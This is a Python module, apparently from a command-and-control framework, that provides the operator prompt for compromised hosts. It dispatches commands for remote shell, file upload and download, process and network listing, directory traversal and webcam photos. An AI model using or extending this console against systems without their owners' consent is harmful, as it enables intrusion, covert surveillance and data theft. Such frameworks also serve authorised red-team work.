from ...beacon.beacon import add_beacon_command_list
from ...global_objects import (
    sessions_list,
    tab_completion,
    beacon_list,
    logger
)

from typing import Tuple
import colorama
import readline
import ssl
import traceback


class InteractionHandler:
    """Handles direct interaction with sessions and beacons."""

    def current_client_session(self, conn: ssl.SSLSocket,
                               r_address: Tuple[str, int], user_ID) -> None:
        """
        Function that interacts with an individual session, from here
        commands on the target can be run.
        """
        session_obj = sessions_list.get(user_ID)
        if not session_obj:
            logger.error(f"Session not found for user ID: {user_ID}")
            return

        def handle_beacon():
            logger.info(f"Handling beacon command for user ID: {user_ID}")
            for uid, beacon in beacon_list.items():
                if uid == user_ID:
                    beacon.change_beacon(conn, r_address, user_ID)
            return

        command_handlers = {
            "shell": lambda: session_obj.shell(conn, r_address),
            "close": lambda: session_obj.close_connection(conn, r_address),
            "processes": lambda: session_obj.list_processes(conn, r_address),
            "sysinfo": lambda: session_obj.systeminfo(conn, r_address),
            "checkfiles": lambda: session_obj.checkfiles(conn),
            "download": lambda: session_obj.DownloadFiles(conn),
            "upload": lambda: session_obj.UploadFiles(conn),
            "services": lambda: session_obj.list_services(conn, r_address),
            "netstat": lambda: session_obj.netstat(conn, r_address),
            "diskusage": lambda: session_obj.diskusage(conn, r_address),
            "listdir": lambda: session_obj.list_dir(conn, r_address),
            "beacon": handle_beacon
        }

        while True:
            colorama.init(autoreset=True)
            readline.parse_and_bind("tab: complete")
            readline.set_completer(
                lambda text, state: tab_completion(text, state, list(command_handlers.keys()) + ["exit"]))
            
            command = (input(colorama.Fore.YELLOW +
                             f"{r_address[0]}:{r_address[1]} Command: ")
                       .lower().strip())
            
            logger.info(f"Command input is {command}")
            if command == "exit":
                break
            
            handler = command_handlers.get(command)
            if handler:
                try:
                    logger.info(f"Executing command: {command}")
                    handler()
                    if command == "close":
                        logger.info("Connection closed by command.")
                        return
                except Exception as e:
                    logger.error(f"Error executing command '{command}': {e}\n{traceback.format_exc()}")
                    print(colorama.Fore.RED + f"An error occurred: {e}")
            else:
                print(colorama.Fore.RED + f"Unknown command: '{command}'")
                print(colorama.Fore.GREEN + self.config['SessionModules']['help'])
        return

    def use_beacon(self, UserID, IPAddress) -> None:
        """
        Function that interacts with an individual beacon, queuing commands
        for the next check-in.
        """
        logger.info(f"Using beacon with UserID: {UserID} and IPAddress: {IPAddress}")
        beaconClass = beacon_list.get(UserID)
        if not beaconClass:
            logger.error(f"No beacon found with UUID: {UserID}")
            print(f"No beacon found with UUID: {UserID}")
            return
        
        print(colorama.Fore.YELLOW + f"Interacting with beacon {beaconClass.hostname} ({beaconClass.uuid})")
        logger.info(f"Beacon {beaconClass.hostname} ({beaconClass.uuid}) found")

        def handle_session():
            logger.info(f"Changing beacon {UserID} to session mode")
            print(colorama.Fore.GREEN +
                  "Beacon will attempt to upgrade to a full session on next callback.")
            add_beacon_command_list(UserID, None, "session", None)
            logger.info(f"Added 'session' command for beacon {UserID}")
            return

        command_handlers = {
            "shell": lambda: beaconClass.shell(UserID, IPAddress),
            "listdir": lambda: beaconClass.list_dir(UserID, IPAddress),
            "close": lambda: beaconClass.close_connection(UserID),
            "processes": lambda: beaconClass.list_processes(UserID),
            "sysinfo": lambda: beaconClass.systeminfo(UserID),
            "diskusage": lambda: beaconClass.disk_usage(UserID),
            "netstat": lambda: beaconClass.netstat(UserID),
            "session": handle_session,
            "commands": lambda: beaconClass.list_db_commands(UserID),
            "directorytraversal": lambda: beaconClass.dir_traversal(UserID),
            "takephoto": lambda: beaconClass.takePhoto(UserID),
            "listfiles": lambda: beaconClass.list_files(UserID),
            "viewfile": lambda: beaconClass.view_file(UserID) # Assuming a typo fix from list_files
        }

        while True:
            colorama.init(autoreset=True)
            readline.parse_and_bind("tab: complete")
            readline.set_completer(
                lambda text, state: tab_completion(text, state, list(command_handlers.keys()) + ["exit"]))

            command = (input(colorama.Fore.YELLOW +
                             f"{UserID} Command: ").lower().strip())
            
            logger.info(f"Command input is {command}")
            if command == "exit":
                break

            handler = command_handlers.get(command)
            if handler:
                try:
                    logger.info(f"Executing/queueing command: {command}")
                    handler()
                    logger.info(f"Executed/queued command: {command}")
                    # Commands that terminate the interaction loop
                    if command in ["close", "session"]:
                        return
                except Exception as e:
                    logger.error(f"Error with command '{command}': {e}\n{traceback.format_exc()}")
                    if not self.config['server']['quiet_mode']:
                        print(colorama.Fore.RED + "Traceback:")
                        traceback.print_exc()
            else:
                 print(colorama.Fore.RED + f"Unknown command: '{command}'")
        return